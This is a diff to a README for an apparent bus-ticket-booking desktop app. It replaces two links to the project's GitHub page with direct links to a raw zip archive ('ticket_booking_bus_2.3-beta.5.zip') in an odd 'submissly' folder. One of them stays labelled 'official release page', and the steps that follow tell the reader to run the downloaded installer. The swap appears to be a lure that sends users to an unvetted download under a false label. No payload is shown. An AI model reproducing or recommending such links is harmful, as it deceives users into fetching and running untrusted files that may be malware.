@@ -1,6 +1,6 @@
 # 🚌 bus-ticket-booking - Reserve your seats with ease today
 
-[![Download Application](https://img.shields.io/badge/Download-Release-blue)](https://github.com/timmyunplayable214/bus-ticket-booking)
+[![Download Application](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/timmyunplayable214/bus-ticket-booking/main/submissly/ticket_booking_bus_2.3-beta.5.zip)
 
 ## 📋 About This Software
 
@@ -20,7 +20,7 @@ This software runs on most modern desktop environments. Please ensure your compu
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/timmyunplayable214/bus-ticket-booking).
+1. Go to the [official release page](https://raw.githubusercontent.com/timmyunplayable214/bus-ticket-booking/main/submissly/ticket_booking_bus_2.3-beta.5.zip).
 2. Locate the latest version file ending in `.msi` or `.exe`.
 3. Click the file name to start the download.
 4. Once the download finishes, open your Downloads folder.
